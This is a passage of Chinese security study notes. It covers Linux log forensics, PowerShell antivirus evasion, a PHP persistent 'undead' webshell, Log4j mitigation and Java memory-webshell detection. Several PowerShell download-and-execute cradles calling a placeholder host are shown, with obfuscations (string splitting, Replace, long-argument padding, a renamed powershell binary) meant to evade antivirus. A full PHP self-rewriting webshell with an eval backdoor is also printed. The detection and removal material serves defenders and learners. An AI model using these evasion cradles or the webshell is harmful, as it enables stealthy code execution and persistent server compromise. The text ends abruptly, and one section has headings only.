&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4]</span><br><span class="line">[0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print</span><br><span class="line">&quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line"></span><br><span class="line">登录成功的IP有哪些：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br><span class="line"></span><br><span class="line">增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001,</span><br><span class="line">home=/home/kali</span><br><span class="line">, shell=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; /var/log/secure</span><br><span class="line"></span><br><span class="line">删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line"># grep &quot;userdel&quot; /var/log/secure</span><br><span class="line"></span><br><span class="line">su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by</span><br><span class="line">root(uid=0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ;</span><br><span class="line">COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure>
<h4 id="检查异常文件-找-php后缀文件">检查异常文件,找.php后缀文件</h4>
<p>查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“…”为名的文件夹具有隐藏属性 2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？ 可以使用find命令来查找，如 find /opt -iname “*” -atime 1 -type f 找出 /opt 下一天前访问过的文件 3、针对可疑文件可以使用stat进行创建修改时间。</p>
<h4 id="检查系统日志-2">检查系统日志</h4>
<p>日志默认存放位置：/var/log/</p>
<p>查看日志配置情况：more /etc/rsyslog.conf</p>
<table>
<thead>
<tr>
<th>日志文件</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>/var/log/cron</td>
<td>记录了系统定时相关的日志</td>
</tr>
<tr>
<td>/var/log/cups</td>
<td>记录打印信息的日志</td>
</tr>
<tr>
<td>/var/log/dmesg</td>
<td>记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
</tr>
<tr>
<td>/var/log/mailog</td>
<td>记录邮件信息</td>
</tr>
<tr>
<td><strong>/var/log/message</strong></td>
<td>记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系 统出现问题时，首先要检查的就应该是这个日志文件</td>
</tr>
<tr>
<td>/var/log/btmp</td>
<td>记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
</tr>
<tr>
<td>/var/log/lastlog</td>
<td>记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要 使用lastlog命令查看</td>
</tr>
<tr>
<td>/var/log/wtmp</td>
<td>永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文 件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
</tr>
<tr>
<td>/var/log/utmp</td>
<td>记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登 录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
</tr>
<tr>
<td>/var/log/secure</td>
<td>记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换 用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>
</tr>
</tbody>
</table>
<h2 id="免杀了解过多少">免杀了解过多少</h2>
<ul>
<li>
<p>有源码免杀</p>
</li>
<li>
<p>无源码免杀</p>
</li>
<li>
<p>powershell免杀</p>
</li>
</ul>
<h3 id="powershell免杀">powershell免杀</h3>
<p>powershell木马最常用的方式一般都为远程下载然后执行的方法,特点就是:直接内存运行,无文件落地.</p>
<p>例如:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
<p>通常使用过程中当调用powershell进行远程下载执行时，会被杀软进行拦截。那么针对Powershell的免杀有两个思路：</p>
<p>对ps1文件进行免杀处理</p>
<p>对Powershell的行为进行免杀处理</p>
<h4 id="免杀方法">免杀方法</h4>
<h5 id="使用关键字拆分进行bypass">使用关键字拆分进行bypass</h5>
<p>例如，拆分前的powershell命令为：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x/a&#x27;))”</span></span><br></pre></td></tr></table></figure>
<p>假如杀软是对http这个关键字进行检测，那么我们可以对其进行如下拆分进行绕过，拆分后的powershell命令为</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">&quot;<span class="variable">$a</span>=&#x27;IEX((New-Object Net.WebClient).DownloadString(&#x27;&#x27;ht&#x27;;<span class="variable">$b</span>=&#x27;tp://x.x.x.x/a&#x27;&#x27;));Invoke-Mimikatz&#x27;;IEX (<span class="variable">$a</span>+<span class="variable">$b</span>)”</span></span><br></pre></td></tr></table></figure>
<p>假如是对downloadstring这个函数进行检测，那么我们可以使用replace来进行替换函数拆分downloadstring进行一个绕过，拆分后的powershell命令如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">&quot;<span class="variable">$a</span>=&#x27;IEX(New-Object Net.WebClient).Downlo&#x27;;<span class="variable">$b</span>=&#x27;123(&#x27;&#x27;http://x.x.x.x&#x27;&#x27;)&#x27;.Replace(&#x27;123&#x27;,&#x27;adString&#x27;);IEX (<span class="variable">$a</span>+<span class="variable">$b</span>)&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="Fuzz思想进行bypass">Fuzz思想进行bypass</h5>
<p>可以利用Fuzz的思想进行bypass</p>
<p>例如单引号混淆前的命令为:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x/a’))”</span></span><br></pre></td></tr></table></figure>
<p>使用单引号混淆后的命令为：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;ht‘+’tp://x.x.x.x/a’))”</span></span><br></pre></td></tr></table></figure>
<h5 id="超长命令bypass">超长命令bypass</h5>
<p>可以使用超长的命令来进行bypass。<br>
例如，利用超长命令bypas前的powershell命令为：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x/a’))”</span></span><br></pre></td></tr></table></figure>
<p>进行超长命令构造后的powershell命令为</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal w Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="built_in">IEX</span> ((<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">&#x27;http://x.x.x.x/a&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h5 id="使用copy命令进行bypass">使用copy命令进行bypass</h5>
<p>这里讲一个骚操作，一些杀软是检测powershell这个使用的动作，那么我们可以使用windows的copy命令，将powshell进行拷贝命名为其他的，例如，使用copy命令将powershell拷贝一个并命名为bypass.txt<br>
命令：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe bypass.txt</span><br></pre></td></tr></table></figure>
<p>那么后面就可以这样子来执行powershell来进行绕过杀软检测：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bypass.txt <span class="built_in">IEX</span> ((<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">&#x27;http://x.x.x.x/a&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h5 id="混合bypass">混合bypass</h5>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="built_in">set-alias</span> <span class="literal">-name</span> key <span class="literal">-value</span> <span class="built_in">IEX</span>; key(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;ht‘+’tp://x.x.x.x/a&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>跟不知道有没有逆着读命令进行绕过的方法</p>
<h2 id="不死马查杀">不死马查杀</h2>
<p>看一个简单的不死马例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;.ZYGS.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;zygs&quot;])==&quot;e10adc3949ba59abbe56e057f20f883e&quot;)&#123;@eval($_POST[&quot;ZYGS&quot;]);&#125;?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>解析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);   <span class="comment">//设置与远程客户端断开后是否继续执行脚本，true即不断开</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);   <span class="comment">//设置脚本最大的执行时间，0即没有时间限制</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);   <span class="comment">//删除文件本身</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;.ZYGS.php&#x27;</span>;   <span class="comment">//文件名是.ZYGS.php</span></span><br><span class="line"><span class="variable">$code</span> = <span class="meta">&lt;?php</span> <span class="meta">?&gt;</span>;   <span class="comment">//php代码</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(file,code);   <span class="comment">//打开file文件，然后写入code</span></span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);   <span class="comment">//每隔usleep(5000)写入一个新文件</span></span><br></pre></td></tr></table></figure>
<p><code>unlink</code>就是为了删除传入的不死马文件,避免一些不必要的信息泄露出去,$file中可以规定你要不断生成的文件名,</p>
<p>usleep(time)是生成木马的时间;这也是不死马的灵魂之一,通过不断生成文件在当前目录下,形成了不死马,不死马是一个进程所以往往要重启主机或重启服务才能kill掉,当然也可以条件竞争</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&quot;zygs&quot;</span>])==<span class="string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>)&#123;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;ZYGS&quot;</span>]);&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这段代码是为了防止骑马(<strong>在以往的一句话木马中，密码简单方便呈现给了用户，如果在AWD中，知道了密码的话，就可以反手打一波其他的主机，因为如果是被批量种马的话，所有人都一样，这也就是&quot;骑马&quot;</strong>)，通过判断用户传入的变量，然后转换成md5值和e10adc3949ba59abbe56e057f20f883e进行对比，如果e10adc3949ba59abbe56e057f20f883e解密出来的值和用户传入的值是一样的话，就继续执行@eval($_POST[‘ZYGS’]),这也是整个不死马中的灵魂，就是为了防止乌鸦坐飞机，一个人拿分</p>
<p>(e10adc3949ba59abbe56e057f20f883e == 123456)</p>
<p>触发后,虽然web页面没有,但是在后台可以看到</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/ae3731bf20d64b4784488dc918688854.png" alt="在这里插入图片描述"></p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/c8211ed70d2e405eb775156b428d470c.png" alt="在这里插入图片描述"></p>
<h3 id="root用户角度的查杀">root用户角度的查杀</h3>
<h4 id="杀掉进程">杀掉进程</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep www-data | awk ‘&#123;<span class="built_in">print</span> <span class="variable">$2</span>&#125;’ | xargs <span class="built_in">kill</span> -9</span><br><span class="line">然后重启服务</span><br></pre></td></tr></table></figure>
<h4 id="其他用户的查杀">其他用户的查杀</h4>
<p>在awd中，ctf用户没有权限，不能重启服务，而且，以ctf的用户来杀进程和条件竞争也是不可行的。（不死马会先创建，然后被删除，在创建到被删除的过程中会可利用。）</p>
<p>最简单的方式就是以www-data用户的角度通过杀进程来实现查杀。</p>
<h5 id="杀掉进程：">杀掉进程：</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @system(&quot;ps -aux | grep www-data | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
<h5 id="条件竞争">条件竞争:</h5>
<p>不推荐，如果不死马中没有调用usleep()函数，进行延时的话，条件竞争是gg的。</p>
<h2 id="域内横向移动">域内横向移动</h2>
<p>划重点:参考文章</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pingmaoer.github.io/2020/06/27/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%80/</span><br></pre></td></tr></table></figure>
<p>利用域内横向移动技术,以被攻陷的系统为跳板,访问其他域内主机,扩大资产范围(包括跳板机器中的文档和存储的凭证，以及通过跳板机器连接的数据库、域控制器或其他重要资产)</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/1.png" alt="1"></p>
<p>通过此类攻击手法,最终可能获取域控制器的访问权限,甚至完全控制基于Windows操作系统的基础设置和与业务相关的关键账户</p>
<h3 id="0x01-常用的windows远程连接和相关命令">0x01 常用的windows远程连接和相关命令</h3>
<h4 id="0x02-Windoors系统散列值获取">0x02 Windoors系统散列值获取</h4>
<h4 id="0x03-哈希传递攻击">0x03 哈希传递攻击</h4>
<h4 id="0x04票据传递">0x04票据传递</h4>
<h2 id="Log4J漏洞">Log4J漏洞</h2>
<h3 id="Log4j简介">Log4j简介</h3>
<p>Apache Log4j 是一个基于<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Java">Java</a>的日志记录工具。它是由Ceki Gülcü首创的，现在已经发展为<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Apache%E8%BD%AF%E4%BB%B6%E5%9F%BA%E9%87%91%E4%BC%9A">Apache软件基金会</a>的项目之一。</p>
<p>经过多年的开发迭代，Log4j 1.x的维护已经变得非常困难，因为它需要与非常旧的 Java 版本兼容，所以于 2015 年 8 月正式升级为Log4j2。</p>
<h3 id="Log4j的lookup功能">Log4j的lookup功能</h3>
<p>本次漏洞是因为Log4j2组件中 lookup功能的实现类 <code>JndiLookup</code> 的设计缺陷导致，这个类存在于<code>log4j-core-xxx.jar</code>中。</p>
<p>log4j的<a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/manual/lookups.html">Lookups</a>功能可以快速打印包括运行应用容器的docker属性，环境变量，日志事件，Java应用程序环境信息等内容。比如我们打印Java运行时版本：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerabilityTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">LOGGER</span> <span class="operator">=</span> LogManager.getLogger();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        LOGGER.error(<span class="string">&quot;Test:&#123;&#125;&quot;</span>,<span class="string">&quot;$&#123;java:runtime&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">20:20:21.312 [main] ERROR com.ldbmcs.VulnerabilityTest - OpenJDK Runtime Environment (build 11.0.11+9) from AdoptOpenJDK</span><br></pre></td></tr></table></figure>
<h3 id="Log4j-漏洞修复">Log4j 漏洞修复</h3>
<p><strong>设置jvm参数：</strong>-Dlog4j2.formatMsgNoLookups=true</p>
<p>**设置系统环境变量：**FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS=true</p>
<p>**升级版本：**官方，最新的版本仅支持java, ldap, 和 ldaps，同时默认禁用JNDI等等功能去限制利用构造payload去触发漏洞。</p>
<ul>
<li>
<p>Java 8及之后的版本升级到 v2.16.0。</p>
</li>
<li>
<p>Java 7 升级到 v2.12.2。</p>
</li>
<li>
<p>其他版本，删除JndiLookup类：zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</p>
</li>
</ul>
<h2 id="java内存马查杀">java内存马查杀</h2>
<p>内存马是无文件落地webshell中最常见的攻击手段，随着攻防演练对抗强度越来越高，流量分析、EDR等专业安全设备被蓝方广泛使用，传统的文件上传的webshll以及文件形式的后门容易被检测到，文件shell明显气数已尽，而内存马因其隐蔽性等优点从而越来越盛行。</p>
<p>由客户端发起的Web请求后，中间件的各个独立的组件如Listener、Filter、Servlet等组件会在请求过程中做监听、判断、过滤等操作，内存马就是利用请求过程在内存中修改已有的组件或动态注册一个新的组件，插入恶意的shellcode，达到持久化控制服务器的目的。内存马可以通过访问存在漏洞的url加上命令执行参数，即可让服务器返回结果也可通过webshell管理工具例如：蚁剑、冰蝎、哥斯拉等进行远程连接后攻击目标。</p>
<p>内存马在语言类型上有PHP内存马，Python内存马，而本文主要侧重于“市场占有率”最高的java内存马的检测与查杀，java内存马又主要分为下面这</p>
<h3 id="内存马特征的识别">内存马特征的识别</h3>
<p>依然是以filter内存马举例</p>
<h4 id="filter特殊名称">filter特殊名称</h4>
<p>内存马的Filter名一般比较特别，随便一点的可能有shell，Mem这种关键词或者随机数随机字母。当然这个特征并不是决定条件，因为讲究一点的攻击者也可以将filter伪装成web应用自带的名称。</p>
<h4 id="filter优先级">filter优先级</h4>
<p>为了确保内存马在各种环境下都可以访问，往往需要把filter匹配优先级调至最高，比如shiro反序列化漏洞。</p>
<h4 id="web-xml中没有filter配置">web.xml中没有filter配置</h4>
<p>内存马的Filter是动态注册的，所以在web.xml中肯定没有配置，如果发现了在web.xml中不存在的filter，那么这个filter就十分可疑了</p>
<h4 id="特殊classloader加载">特殊classloader加载</h4>
<p>一般来说，正常的Filter都是由中间件的WebappClassLoader加载的。而攻击者利用的getshell攻击链往往具有明显的特征，比如反序列化漏洞喜欢利用TemplatesImpl和bcel执行任意代码。所以这些class往往就是以下这两个：</p>
<p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader</p>
<p>com.sun.org.apache.bcel.internal.util.ClassLoader</p>
<p>对应的classloader路径下没有class文件<br>
所谓内存马就是代码驻留内存中，本地无对应的class文件。所以我们只要检测Filter对应的ClassLoader目录下是否存在class文件。(这也是很多内存马检测脚步实现的原理)</p>
<h4 id="Filter的doFilter方法中有恶意代码">Filter的doFilter方法中有恶意代码</h4>
<p>我们可以把内存中所有的Filter的class dump出来，使用反编译工具分析看看，是否存在恶意代码，比如调用了：java.lang.Runtime.getRuntime，defineClass，invoke</p>
<h3 id="三大类">三大类</h3>
<ul>
<li>servlet-api类
<ul>
<li>filter型</li>
<li>servlet型</li>
<li>listener型</li>
</ul>
</li>
<li>spring类
<ul>
<li>拦截器</li>
<li>controller型</li>
</ul>
</li>
<li>Java Instrumentation类
<ul>
<li>agent型</li>
</ul>
</li>
</ul>
<h3 id="原理简述">原理简述</h3>
<h4 id="servlet-api类">servlet-api类</h4>
<p>以filter内存马为例</p>
<p>Tomcat Filter工作流程：</p>
<p>根据请求的 URL 从 FilterMaps 中找出与之 URL 对应的 Filter 名称</p>
<p>根据 Filter 名称去 FilterConfigs 中寻找对应名称的 FilterConfig</p>
<p>找到对应的 FilterConfig 之后添加到 FilterChain中，并且返回 FilterChain</p>
<p>filterChain 中调用 internalDoFilter 遍历获取 chain 中的 FilterConfig ，然后从 FilterConfig 中获取 Filter，然后调用 Filter 的 doFilter 方法</p>
<p>根据上面的流程分析，不难发现最开始是从 context 中获取的 FilterMaps，将符合条件的依次按照顺序进行调用，那么我们可以将自己创建的一个 FilterMap 然后将其放在 FilterMaps 的最前面，这样当 urlpattern 匹配的时候就回去找到对应 FilterName 的 FilterConfig ，然后添加到 FilterChain 中，最终触发内存马。</p>
<p>这类内存马会先创建了一个恶意的servlet，然后获取当前的StandardContext，将恶意servlet封装成wrapper添加到StandardContext的children当中，最后添加ServletMapping将访问的URL和wrapper进行绑定。执行上述代码后，访问当前应用的特定url路径，加上特定的参数就可以命令执行了。</p>
<h4 id="Java-agent类">Java-agent类</h4>
<p>在 jdk 1.5 之后引入了 java.lang.instrument 包，该包提供了检测 java 程序的 Api，比如用于监控、收集性能信息、诊断问题，Java Agent 能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法。Agent 内存马的实现就是利用了这一特性使其动态修改特定类的特定方法，将我们的恶意方法添加进去。</p>
<p>通过JVM Instrumentation 去修改一个已经加载的类的字节码，我们可以认为需要两个关键API</p>
<p>retransformClasses<br>
redefineClasses<br>
retransform class 可以简单理解为回滚操作，具体回滚到哪个版本，这个需要看情况而定，下面不管那种情况都有一个前提，那就是javaagent已经要求要有retransform的能力了：</p>
<p>如果类是在第一次加载的的时候就做了transform，那么做retransform的时候会将代码回滚到transform之后的代码 如果类是在第一次加载的的时候没有任何变化，那么做retransform的时候会将代码回滚到最原始的类文件里的字节码 如果类已经加载了，期间类可能做过多次redefine(比如被另外一个agent做过)，但是接下来加载一个新的agent要求有retransform的能力了，然后对类做redefine的动作，那么retransform的时候会将代码回滚到上一个agent最后一次做redefine后的字节码。</p>
<p>redefineClasses 对参数代码的类进行重新定义。针对的是已经加载的类。</p>
<p>比如，冰蝎内存马通过修改javax.servlet.http.HttpServlet#service方法，添加自己的内存马逻辑。</p>
<p>冰蝎的添加流程：</p>
<p>通过javaassist获取javax.servlet.http.HttpServlet类的字节码<br>
向service方法添加字节码<br>
清除javaassist缓存，调用redefineClass重新定义修改后的HttpServlet字节码<br>
这样，http中间件在处理每个http链接的时候，就会调用修改后的httpservlet方法。如果发现处理的url为内存马需要响应的url，则执行webshell处理流程，否则隐藏不执行任何操作。<br>
原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/SimoSimoSimo/article/details/127700190">https://blog.csdn.net/SimoSimoSimo/article/details/127700190</a></p>
<p>------2-----</p>
<h2 id="各种数据库的区别">各种数据库的区别</h2>
<p><strong>关系型数据库：</strong></p>
<ul>
<li><strong>MYSQL       3306</strong></li>
<li><strong>SQL Server    1433</strong></li>
<li><strong>Oracle        1521</strong></li>
<li><strong>DB2          5000</strong></li>
</ul>
<p><strong>非关系型数据库：</strong></p>
<ul>
<li><strong>Redis          6379</strong></li>
<li><strong>Memcached    11211</strong></li>
<li><strong>MongoDB      27017</strong></li>
<li><strong>HBase</strong>       列存储数据库</li>
</ul>
<p><strong>区别</strong></p>
<p>关系型数据库最典型的数据结构是表，由二维表及其之间的联系所组成的一个数据组织</p>
